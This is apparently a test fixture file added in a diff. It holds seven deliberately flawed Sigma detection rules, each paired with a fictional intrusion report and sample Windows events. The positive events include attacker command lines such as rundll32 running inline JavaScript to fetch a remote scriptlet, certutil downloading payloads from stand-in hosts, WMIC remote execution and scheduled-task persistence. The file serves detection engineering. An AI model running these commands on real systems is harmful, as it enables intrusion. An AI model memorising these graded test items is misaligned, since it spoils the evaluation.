@@ -1,0 +1,488 @@
+{
+ "cases": [
+  {
+   "assumptions": [],
+   "defect_class": "D2",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,0",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "C:\\Windows\\explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "rundll32.exe printui.dll,PrintUIEntry /in /n\\\\printsrv.lab.example\\HPLaser",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\spoolsv.exe",
+      "parent_cmd": "C:\\Windows\\System32\\spoolsv.exe",
+      "user": "LAB\\carol"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "notepad.exe C:\\Users\\alice\\notes.txt",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "C:\\Windows\\explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "ipconfig /all",
+      "image": "C:\\Windows\\System32\\ipconfig.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\carol"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://stage.harborlantern.test/a.sct\")",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "parent_cmd": "WINWORD.EXE /n invoice.docx",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "RUNDLL32.EXE JAVASCRIPT:\"\\..\\mshtml,RunHTMLApplication \";h=new ActiveXObject('WScript.Shell');h.Run('calc.exe')",
+      "image": "C:\\Windows\\SysWOW64\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe /c start",
+      "user": "LAB\\bob"
+     }
+    ]
+   },
+   "evidence": [
+    "Responders recovered a command line that began with rundll32.exe javascript: and called the mshtml,RunHTMLApplication export"
+   ],
+   "expected_gate": "G2",
+   "id": "D2-01",
+   "logsource": "windows_process_creation",
+   "report_text": "Harbor Lantern intrusion, workstation LAB-WS-14. The operator avoided dropping a binary and instead abused a signed Windows utility to run script content directly. Responders recovered a command line that began with rundll32.exe javascript: and called the mshtml,RunHTMLApplication export, launched as a child of WINWORD.EXE. The RunHTMLApplication export of mshtml.dll evaluates the inline script, which then retrieved a second stage from stage.harborlantern.test. The same pattern appeared on three other workstations over one weekend. Analysts found no legitimate software in the environment that pairs rundll32.exe with the javascript: scheme, and because the script never touches disk the process command line is the most reliable observable.",
+   "role": "defective",
+   "sigma_yaml": "title: Rundll32 Evaluating Inline JavaScript via RunHTMLApplication\nid: 5c0e7a1d-93b4-4f28-a6d1-9d41c2e7b05g\nstatus: experimental\ndescription: Detects rundll32 evaluating inline script through the mshtml RunHTMLApplication export as seen in the Harbor Lantern intrusion.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.stealth\n  - attack.t1218.011\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\rundll32.exe'\n    CommandLine|contains|all:\n      - 'javascript:'\n      - 'RunHTMLApplication'\n  condition: selection\nfalsepositives:\n  - Legitimate software that embeds script through rundll32 was not observed in the laboratory\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1218.011"
+   ],
+   "why": "The id field is present and has the 8-4-4-4-12 shape of a UUID, but its final character is 'g', which is not a hexadecimal digit, so it is not a valid UUID. Every other field and the detection logic are valid."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D2",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "dest_ip": "198.51.100.44",
+      "dest_port": "8531",
+      "image": "C:\\Program Files\\Contoso Backup\\bkagent.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "198.51.100.46",
+      "dest_port": "8531",
+      "image": "C:\\Program Files\\SyncVault\\syncvault.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "negative": [
+     {
+      "dest_ip": "198.51.100.10",
+      "dest_port": "443",
+      "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "192.0.2.5",
+      "dest_port": "445",
+      "image": "C:\\Windows\\System32\\svchost.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "positive": [
+     {
+      "dest_ip": "203.0.113.77",
+      "dest_port": "8531",
+      "image": "C:\\Users\\Public\\updchk.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "203.0.113.77",
+      "dest_port": "8531",
+      "image": "C:\\ProgramData\\Updater\\UPDCHK.EXE",
+      "kind": "network_connect"
+     }
+    ]
+   },
+   "evidence": [
+    "updchk.exe opened outbound TCP connections to 203.0.113.77 on port 8531 roughly every ninety seconds"
+   ],
+   "expected_gate": "G2",
+   "id": "D2-02",
+   "logsource": "windows_network_connection",
+   "report_text": "CraneMail follow-on activity, finance subnet. After installation the implant, a loader named updchk.exe, stopped using web ports. Network telemetry showed updchk.exe opened outbound TCP connections to 203.0.113.77 on port 8531 roughly every ninety seconds. Port 8531 was not on the approved outbound list for the finance subnet, and the actor appears to have chosen it because the perimeter proxy only inspects traffic on port 443. The traffic itself looked like TLS, with a self-signed certificate. Two other hosts showed the same beaconing pattern the following day. Responders blocked the address at the firewall and quarantined the three hosts, and the implant was not seen again after the block.",
+   "role": "defective",
+   "sigma_yaml": "title: Updchk Loader Beaconing to Actor Address on Non-Standard Port\nid: 7e2b94f0-1a3d-4c85-8d62-b04f7a1c93e5\nstatus: stable\ndescription: Detects the updchk.exe implant connecting to the actor address 203.0.113.77 on TCP port 8531.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1571\nlogsource:\n  category: network_connection\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\updchk.exe'\n    DestinationIp: '203.0.113.77'\n    DestinationPort: '8531'\n  condition: selection\nfalsepositives:\n  - A different product that happens to share the file name and uses the same address and port is not expected\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1571"
+   ],
+   "why": "The status field is 'stable', but the laboratory contract requires every generated rule to carry status experimental. All other metadata and the detection logic are valid."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D2",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "dns_query",
+      "name": "www.vesperline.test"
+     },
+     {
+      "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+      "kind": "dns_query",
+      "name": "mail.vesperline.test"
+     }
+    ],
+    "negative": [
+     {
+      "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "kind": "dns_query",
+      "name": "intranet.lab.example"
+     },
+     {
+      "image": "C:\\Windows\\System32\\svchost.exe",
+      "kind": "dns_query",
+      "name": "time.lab.example"
+     }
+    ],
+    "positive": [
+     {
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "dns_query",
+      "name": "6d61696c626f78402d73746167656431.tunnel.vesperline.test"
+     },
+     {
+      "image": "C:\\Users\\Public\\svcmon.exe",
+      "kind": "dns_query",
+      "name": "a3f1c9d2e7b0441800ff.tunnel.vesperline.test"
+     }
+    ]
+   },
+   "evidence": [
+    "resolving long hex-encoded labels beneath tunnel.vesperline.test"
+   ],
+   "expected_gate": "G2",
+   "id": "D2-03",
+   "logsource": "windows_dns_query",
+   "report_text": "Vesperline engagement, host LAB-FIN-07. The backdoor moved staged data out of the network over DNS rather than a direct connection. Packet captures and resolver logs showed the process resolving long hex-encoded labels beneath tunnel.vesperline.test, with each query carrying a small slice of the stolen archive in its leftmost label. Query volume peaked at several hundred lookups per minute during the exfiltration window. The parent domain vesperline.test is also used by the vendor for ordinary web hosting, so analysts limited the indicator to the tunnel subdomain. The authoritative name server for tunnel.vesperline.test answered every query with a short TXT or A record, which the backdoor treated as an acknowledgement.",
+   "role": "defective",
+   "sigma_yaml": "title: DNS Tunnelling Queries Under the Vesperline Tunnel Subdomain\nid: c3a81d6e-52f7-4b09-9e14-2d7f60a8b3c1\nstatus: experimental\ndescription: Detects DNS lookups beneath the tunnel subdomain used by the Vesperline backdoor for data exfiltration.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1071.004\nlogsource:\n  category: dns_query\n  product: windows\ndetection:\n  selection:\n    QueryName|endswith: 'tunnel.vesperline.test'\n  condition: selection\nfalsepositives: []\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1071.004"
+   ],
+   "why": "The falsepositives key is present but its value is an empty list, so the rule carries no false-positive guidance although at least one entry is required. The field exists, which a presence-only check would accept; all other metadata and the logic are valid."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D2",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "wmic.exe process list brief",
+      "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\dave"
+     },
+     {
+      "cmd": "wmic.exe /node:LAB-FS-02 os get caption,version",
+      "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\itadmin"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "hostname",
+      "image": "C:\\Windows\\System32\\hostname.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\dave"
+     },
+     {
+      "cmd": "notepad.exe C:\\Users\\dave\\todo.txt",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "C:\\Windows\\explorer.exe",
+      "user": "LAB\\dave"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "wmic.exe /node:LAB-FS-02 process call create \"cmd.exe /c C:\\Windows\\Temp\\s.exe\"",
+      "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\svc_deploy"
+     },
+     {
+      "cmd": "WMIC.exe /NODE:LAB-FS-03 process call create \"cmd.exe /c C:\\Windows\\Temp\\s.exe\"",
+      "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "parent_cmd": "powershell.exe",
+      "user": "LAB\\svc_deploy"
+     }
+    ]
+   },
+   "evidence": [
+    "Responders recovered the command wmic.exe /node:LAB-FS-02 process call create from the jump server"
+   ],
+   "expected_gate": "G2",
+   "id": "D2-04",
+   "logsource": "windows_process_creation",
+   "report_text": "Moorlight lateral movement review. After obtaining a service account, the operator pivoted from the jump server to file servers using built-in tooling. Responders recovered the command wmic.exe /node:LAB-FS-02 process call create from the jump server, followed by a cmd.exe payload staged under the Temp directory of the target. The same wmic.exe pattern with a different /node: value appeared against LAB-FS-03 twenty minutes later. Using wmic.exe with process call create against a remote node leaves the spawned process as a child of WmiPrvSE.exe on the target, which is why the source-side command line is the better detection point. Local administrators on the jump server were not observed using this form during the baseline period.",
+   "role": "defective",
+   "sigma_yaml": "title: WMIC Remote Process Creation via Node Switch\nid: 18f6d2a9-0c47-4e3b-b5a2-6e91d4c7f082\nstatus: experimental\ndescription: Detects wmic.exe creating a process on a remote node as seen in the Moorlight lateral movement.\nreferences:\n  - urn:atidep:case\nauthor: \"   \"\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.t1047\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\wmic.exe'\n    CommandLine|contains|all:\n      - 'process call create'\n      - '/node:'\n  condition: selection\nfalsepositives:\n  - Administrators creating remote processes with wmic during approved maintenance\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1047"
+   ],
+   "why": "The author key holds a string made only of three spaces, so no author is actually recorded. The key is present and non-empty as a raw string, which a naive presence check would accept; all other metadata and the logic are valid."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D2",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "certutil.exe -hashfile C:\\Tools\\installer.msi SHA256",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\itadmin"
+     },
+     {
+      "cmd": "certutil.exe -urlcache * delete",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\itadmin"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "ping 192.0.2.1",
+      "image": "C:\\Windows\\System32\\PING.EXE",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\erin"
+     },
+     {
+      "cmd": "tasklist /v",
+      "image": "C:\\Windows\\System32\\tasklist.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\erin"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "certutil.exe -urlcache -split -f http://stage.saltmarsh.test/p.bin C:\\Users\\Public\\p.bin",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\dave"
+     },
+     {
+      "cmd": "certutil -urlcache -split -f http://198.51.100.23/a.dll C:\\Users\\Public\\a.dll",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "parent_cmd": "powershell.exe",
+      "user": "LAB\\dave"
+     }
+    ]
+   },
+   "evidence": [
+    "The operator downloaded the payload with certutil.exe -urlcache -split -f http://stage.saltmarsh.test/p.bin"
+   ],
+   "expected_gate": "G2",
+   "id": "D2-05",
+   "logsource": "windows_process_creation",
+   "report_text": "Saltmarsh stage-two retrieval. The operator downloaded the payload with certutil.exe -urlcache -split -f http://stage.saltmarsh.test/p.bin and wrote it to the Public profile directory before running it. The certutil.exe invocation came from an interactive cmd.exe session opened over an RDP connection with stolen credentials. Responders observed the same urlcache and split switches on a second host eleven minutes later, this time pointing at a numeric address in the documentation range rather than a hostname. Certutil is a signed Windows binary, which is why the actor preferred it over a custom downloader, and administrators in this environment normally use it only for certificate and hash tasks.",
+   "role": "defective",
+   "sigma_yaml": "title: Certutil URL Cache Download with Split Switch\nid: a94e3b17-6d2c-4f80-81b5-3c0e7d29a6f4\nstatus: experimental\ndescription: Detects certutil.exe fetching a remote file with the urlcache and split switches as seen in the Saltmarsh intrusion.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 02/10/2026\ntags:\n  - attack.command_and_control\n  - attack.t1105\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\certutil.exe'\n    CommandLine|contains|all:\n      - 'urlcache'\n      - 'split'\n  condition: selection\nfalsepositives:\n  - Administrators downloading certificate revocation data by hand with certutil\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1105"
+   ],
+   "why": "The date is written 02/10/2026 (day/month/year), but the contract requires the format YYYY/MM/DD. All other metadata and the detection logic are valid."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D2",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "dest_ip": "198.51.100.62",
+      "dest_port": "443",
+      "image": "C:\\Program Files\\Contoso Remote\\crsupport.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "192.0.2.30",
+      "dest_port": "3389",
+      "image": "C:\\Windows\\System32\\mstsc.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "negative": [
+     {
+      "dest_ip": "192.0.2.80",
+      "dest_port": "993",
+      "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "203.0.113.9",
+      "dest_port": "443",
+      "image": "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "positive": [
+     {
+      "dest_ip": "198.51.100.61",
+      "dest_port": "443",
+      "image": "C:\\Users\\erin\\AppData\\Local\\TetherDesk\\tetherdesk.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "198.51.100.61",
+      "dest_port": "6568",
+      "image": "C:\\Users\\Public\\tetherdesk.exe",
+      "kind": "network_connect"
+     }
+    ]
+   },
+   "evidence": [
+    "tetherdesk.exe opening outbound connections to the relay address 198.51.100.61"
+   ],
+   "expected_gate": "G2",
+   "id": "D2-06",
+   "logsource": "windows_network_connection",
+   "report_text": "Alderwick incident, accounting workstation LAB-ACC-03. After phishing, the actor installed a commercial remote access product named TetherDesk so that the operator could interact with the desktop without custom malware. Network telemetry showed tetherdesk.exe opening outbound connections to the relay address 198.51.100.61, which is not part of the vendor's published relay ranges and is attributed to the actor's own relay server. The agent was installed under a user profile directory without administrator rights and was configured to start at logon. The organisation does not license TetherDesk, and a software inventory found no authorised installation anywhere in the estate before the incident.",
+   "role": "defective",
+   "sigma_yaml": "title: TetherDesk Agent Connecting to Actor Relay Address\nid: 0b7d5c32-e8a1-4296-a3f0-5d1c8e46b972\nstatus: experimental\ndescription: Detects the unlicensed TetherDesk remote access agent connecting to the actor relay observed in the Alderwick incident.\nreferences:\n  - ''\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1219\nlogsource:\n  category: network_connection\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\tetherdesk.exe'\n    DestinationIp: '198.51.100.61'\n  condition: selection\nfalsepositives:\n  - Authorised use of TetherDesk is not expected because the product is not licensed\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1219"
+   ],
+   "why": "The references list is non-empty, but its only element is an empty string, so there is no URL or urn reference. A check that only tests for a non-empty list would accept it; all other metadata and the logic are valid."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D2",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "schtasks.exe /create /tn BackupNightly /tr C:\\Tools\\backup.cmd /sc daily /st 02:00",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\itadmin"
+     },
+     {
+      "cmd": "schtasks.exe /query /fo LIST /v",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\itadmin"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "calc.exe",
+      "image": "C:\\Windows\\System32\\calc.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "C:\\Windows\\explorer.exe",
+      "user": "LAB\\grace"
+     },
+     {
+      "cmd": "whoami /groups",
+      "image": "C:\\Windows\\System32\\whoami.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\grace"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "schtasks.exe /create /tn OneDriveSyncCheck /tr C:\\ProgramData\\msdrv\\svc.exe /sc onlogon /ru SYSTEM",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\frank"
+     },
+     {
+      "cmd": "schtasks /create /f /sc ONLOGON /tn \"Printer Health\" /tr \"C:\\ProgramData\\msdrv\\svc.exe\"",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "parent_cmd": "powershell.exe",
+      "user": "LAB\\frank"
+     }
+    ]
+   },
+   "evidence": [
+    "Responders recovered the command schtasks.exe /create /tn OneDriveSyncCheck followed by a trigger of /sc onlogon",
+    "a binary in a folder named msdrv under ProgramData"
+   ],
+   "expected_gate": "G2",
+   "id": "D2-07",
+   "logsource": "windows_process_creation",
+   "report_text": "Saltmarsh persistence note, workstation LAB-HR-11. To survive reboots the operator registered a scheduled task instead of writing a Run key. Responders recovered the command schtasks.exe /create /tn OneDriveSyncCheck followed by a trigger of /sc onlogon, with the task action pointing at a binary in a folder named msdrv under ProgramData. The task name was chosen to look like a OneDrive housekeeping job, and the msdrv folder name imitates a driver directory. The same folder name and logon trigger were present on a second HR workstation. Administrators in this environment create scheduled tasks for backups and patching, but none of those tasks use a logon trigger or an msdrv folder.",
+   "role": "defective",
+   "sigma_yaml": "title: Scheduled Task Created with Logon Trigger Pointing at Msdrv Folder\nid: d26f81c4-3a95-4b7e-8c10-97e2a5b4d3f6\nstatus: experimental\ndescription: Detects schtasks.exe registering a logon-triggered task whose action sits in the msdrv folder as seen in the Saltmarsh persistence.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.persistence\n  - attack.privilege_escalation\n  - attack.t1053.005\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\schtasks.exe'\n    CommandLine|contains|all:\n      - '/create'\n      - 'onlogon'\n      - 'msdrv'\n  condition: selection\nfalsepositives:\n  - Administrators who deploy logon tasks from a folder named msdrv are not expected\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1053.005"
+   ],
+   "why": "The level key is omitted entirely from the rule, although level is a required metadata field. Every other required key is present and valid."
+  }
+ ]
+}
